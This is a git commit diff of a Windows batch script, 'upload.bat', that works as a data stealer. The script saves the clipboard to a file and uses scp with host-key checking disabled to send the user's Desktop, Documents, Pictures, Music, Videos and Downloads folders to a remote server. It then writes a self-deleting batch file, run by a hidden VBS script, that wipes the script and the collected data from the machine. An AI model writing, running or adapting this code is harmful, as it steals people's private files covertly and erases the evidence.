4552b3bdd1fb8935a833ce655b15c846114fa91b
Colbster937 <96893162+colbychittenden@users.noreply.github.com>
2024-03-19 11:18:59 -0700

    Add files via upload

--- upload.bat
+++ upload.bat
@@ -48,22 +48,16 @@ powershell get-clipboard > clipboard.txt
 cd %startDir%
 scp -o StrictHostKeyChecking=no -r "%COMPUTERNAME%" %user%@%host%:/home/%user%/
 cd "%COMPUTERNAME%\%USERNAME%\%MYDATE%\"
-if exist "%USERPROFILE%\Desktop" ( %copy% "%USERPROFILE%\Desktop" "%cd%\files\Desktop" ) else if exist "%USERPROFILE%\OneDrive\Desktop" ( %copy% "%USERPROFILE%\OneDrive\Desktop" "%cd%\files\Desktop" )
-scp -o StrictHostKeyChecking=no -r "%cd%\files\Desktop" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
-if exist "%USERPROFILE%\Pictures" ( %copy% "%USERPROFILE%\Pictures" "%cd%\files\Pictures" ) else if exist "%USERPROFILE%\OneDrive\Pictures" ( %copy% "%USERPROFILE%\OneDrive\Pictures" "%cd%\files\Pictures" )
-scp -o StrictHostKeyChecking=no -r "%cd%\files\Pictures" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
-if exist "%USERPROFILE%\Documents" ( %copy% "%USERPROFILE%\Documents" "%cd%\files\Documents" ) else if exist "%USERPROFILE%\OneDrive\Documents" ( %copy% "%USERPROFILE%\OneDrive\Documents" "%cd%\files\Documents" )
-scp -o StrictHostKeyChecking=no -r "%cd%\files\Documents" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
-if exist "%USERPROFILE%\Music" ( %copy% "%USERPROFILE%\Music" "%cd%\files\Music" ) else if exist "%USERPROFILE%\OneDrive\Music" ( %copy% "%USERPROFILE%\OneDrive\Music" "%cd%\files\Music" )
-scp -o StrictHostKeyChecking=no -r "%cd%\files\Music" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
-if exist "%USERPROFILE%\Videos" ( %copy% "%USERPROFILE%\Videos" "%cd%\files\Videos" ) else if exist "%USERPROFILE%\OneDrive\Videos" ( %copy% "%USERPROFILE%\OneDrive\Videos" "%cd%\files\Videos" )
-scp -o StrictHostKeyChecking=no -r "%cd%\files\Videos" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
-if exist "%USERPROFILE%\Downloads" ( %copy% "%USERPROFILE%\Downloads" "%cd%\files\Downloads" ) else if exist "%USERPROFILE%\OneDrive\Downloads" ( %copy% "%USERPROFILE%\OneDrive\Downloads" "%cd%\files\Downloads" )
-scp -o StrictHostKeyChecking=no -r "%cd%\files\Downloads" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+if exist "%USERPROFILE%\Desktop" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\Desktop" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ ) else if exist "%USERPROFILE%\OneDrive\Desktop" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\OneDrive\Desktop" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ )
+if exist "%USERPROFILE%\Pictures" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\Pictures" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ ) else if exist "%USERPROFILE%\OneDrive\Pictures" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\OneDrive\Pictures" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ )
+if exist "%USERPROFILE%\Documents" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\Documents" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ ) else if exist "%USERPROFILE%\OneDrive\Documents" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\OneDrive\Documents" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ )
+if exist "%USERPROFILE%\Music" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\Music" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ ) else if exist "%USERPROFILE%\OneDrive\Music" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\OneDrive\Music" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ )
+if exist "%USERPROFILE%\Videos" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\Videos" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ ) else if exist "%USERPROFILE%\OneDrive\Videos" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\OneDrive\Videos" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ )
+if exist "%USERPROFILE%\Downloads" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\Downloads" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ ) else if exist "%USERPROFILE%\OneDrive\Downloads" ( scp -o StrictHostKeyChecking=no -r "%USERPROFILE%\OneDrive\Downloads" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/ )
 echo @echo off > "del%r%.bat"
-echo del /q /f "run.vbs" > "del%r%.bat"
+echo del -r "%COMPUTERNAME%" >> "del%r%.bat"
+echo del /q /f "run.vbs" >> "del%r%.bat"
 echo del /q /f "upload.bat" >> "del%r%.bat"
-echo del /q /f /r "%COMPUTERNAME%" >> "del%r%.bat"
 echo del /q /f "%%cd%%\%%~n0%%~x0" ^>nul 2^>^&1 ^& exit /b 0 >> "del%r%.bat"
 echo Set objShell = WScript.CreateObject("WScript.Shell") > "run.vbs"
 echo objShell.Run "%cd%\del%r%.bat", 0, True >> "run.vbs"
